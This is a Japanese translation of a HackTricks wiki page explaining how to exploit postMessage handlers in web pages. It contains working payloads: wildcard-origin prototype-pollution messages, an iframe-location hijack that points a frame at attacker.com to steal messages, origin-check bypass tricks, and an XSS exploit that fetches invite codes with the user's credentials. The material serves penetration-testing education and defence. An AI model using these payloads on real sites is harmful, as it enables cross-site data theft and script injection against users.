# PostMessageの脆弱性

## PostMessageの脆弱性

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## **PostMessage**の送信

**PostMessage**は以下の関数を使用してメッセージを送信します：
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin** は '\*' や _https://company.com_ のようなURLにすることができます。\
**第二のシナリオ**では、**メッセージはそのドメインにのみ送信されます**（ウィンドウオブジェクトのオリジンが異なっていても）。\
**ワイルドカード**を使用すると、**メッセージは任意のドメインに送信される**可能性があり、Windowオブジェクトのオリジンに送信されます。

### iframeと**targetOrigin**のワイルドカードを攻撃する

[**このレポート**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)で説明されているように、`X-Frame-Header` 保護がない（**iframed**可能）ページで、**ワイルドカード** (\*)を使用して**postMessage**を介して**機密**メッセージを送信している場合、**iframe**の**オリジン**を**変更**して、**機密**メッセージを自分がコントロールするドメインに**漏洩**させることができます。\
ただし、ページがiframed可能でも、**targetOrigin**がURLに**設定されていてワイルドカードではない場合**、この**トリックは機能しません**。
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener の悪用

**`addEventListener`** は、JSによって宣言される関数で、**`postMessages` を待ち受ける** 機能です。\
以下のようなコードが使用されます：
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
以下のコードでは、**最初に行うこと**は**オリジンをチェックする**ことです。これは、受け取った情報で**何かセンシティブな操作**（パスワードの変更など）を行う場合に非常に**重要**です。**オリジンをチェックしない場合、攻撃者は被害者に任意のデータをこのエンドポイントに送信させ**、被害者のパスワードを変更させることができます（この例では）。

### 列挙

現在のページで**イベントリスナーを見つける**ためには、以下の方法があります：

* JSコードで `window.addEventListener` と `$(window).on` (_JQueryバージョン_) を**検索**
* 開発者ツールのコンソールで実行： `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* ブラウザの開発者ツールで _Elements --> Event Listeners_ に**移動**

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) や [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) のような**ブラウザ拡張機能**を使用。これらのブラウザ拡張機能は**すべてのメッセージを傍受**し、表示します。

### オリジンチェックのバイパス

* **`event.isTrusted`** は、イベントがユーザーアクションによって生成された場合にTrueになります。正しく配置されていれば実質的にバイパスできませんが、言及する価値はあります。
* PostMessageイベントの**オリジン**をチェックするために**`indexOf()`** が使用されている場合、以下の例のように簡単にバイパスできることを覚えておいてください：
```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* **`search()`** が**オリジン**を**検証**するために使用される場合、安全でない可能性があります。`String.prototype.search()` のドキュメントによると、このメソッドは文字列ではなく**正規表現オブジェクトを取る**とされています。正規表現以外のものが渡された場合、暗黙的に正規表現に変換されます。
正規表現では、**ドット (.) はワイルドカードとして扱われます**。攻撃者はこれを利用して、公式のドメインの代わりに**特別なドメイン**を使用し、検証をバイパスすることができます。例えば：
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* 前の例と同様に、**`match()`** も**正規表現**をチェックするため、正規表現が不正な形式であれば**バイパス可能**です。
* **`escapeHtml`** 関数が使用される場合、関数は`new`エスケープされたオブジェクトを作成せず、既存のオブジェクトの**プロパティを上書き**します。これは、`hasOwnProperty`に反応しない制御されたプロパティを持つオブジェクトを作成できる場合、それはエスケープされないことを意味します。
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
`File`オブジェクトは、読み取り専用の`name`プロパティを持っており、私たちのテンプレートで使用され、`escapeHtml`関数をバイパスするため、このエクスプロイトに最適です。

### e.origin == window.origin バイパス

ページが`<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`を介して**sandboxed iframe**に埋め込まれると、その**iframe**の**origin**は**`null`**になります。

**sandbox値 `allow-popups`が設定されている場合**、**開かれたポップアップ**は`allow-popups-to-escape-sandbox`が設定されていない限り、すべての**sandboxed属性**を**継承**します。\
したがって、**null origin**から**ポップアップ**を開くと、ポップアップ内の**`window.origin`**も**`null`**になります。

したがって、ポップアップを許可する**sandboxed iframe**を開き、そのiframe内から**ポップアップを開き**、iframe**からポップアップ**へ**postMessageを送信**すると、両方のoriginがnullになるため：**`e.origin == window.origin == null`**

詳細については**読んでください**：

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.sourceのバイパス

メッセージがスクリプトがリスニングしている同じウィンドウから来たかどうかを確認することが可能です（特に、メッセージが同じページから送信されたかどうかを確認するために、ブラウザ拡張機能の**Content Scripts**にとって興味深い）。
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
メッセージの **`e.source`** をnullに強制するには、**iframe** を作成して **postMessage** を**送信**し、**直ちに削除**します。

詳細については**以下を読んでください:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header のバイパス

これらの攻撃を理想的に実行するためには、被害者のウェブページを `iframe` 内に**配置**できることが望ましいです。しかし、`X-Frame-Header` のようなヘッダーはその**挙動**を**防ぐ**ことができます。\
そのようなシナリオでは、あまり隠密ではない攻撃を使用することができます。新しいタブを脆弱なウェブアプリケーションに開き、それと通信することができます：
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### メインページをブロックして子ページへのメッセージを盗む

以下のページでは、**メイン**ページをデータ送信前に**ブロック**し、子**iframe**に対する**XSS**を悪用して、受信される前に**sensitive postmessage data**を**leak**する方法を見ることができます：

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframeの位置を変更してメッセージを盗む

X-Frame-Headerがないウェブページをiframeできる場合、そのページが別のiframeを含んでいれば、その子iframeの**location**を**変更**できます。したがって、**wildcard**を使用して送信された**postmessage**を受信している場合、攻撃者はそのiframeの**origin**を自分が**controlled**するページに**変更**し、メッセージを**steal**することができます：

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageを利用したPrototype Pollutionおよび/またはXSS

`postMessage`を通じて送信されたデータがJSによって実行されるシナリオでは、**ページ**を**iframe**し、`postMessage`を介して**prototype pollution/XSS**の**exploit**を送信できます。

`postMessage`を通じた**非常によく説明されたXSS**の例は、[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)で見つけることができます。

`postMessage`を通じて`iframe`に**Prototype Pollution そして XSS**を悪用するexploitの例：
```markup
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**詳細情報**については：

* [**プロトタイプ汚染**](../deserialization/nodejs-proto-prototype-pollution/)についてのページへのリンク
* [**XSS**](../xss-cross-site-scripting/)についてのページへのリンク
* [**クライアントサイドプロトタイプ汚染からのXSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)についてのページへのリンク

## 参考文献

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* 練習用: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
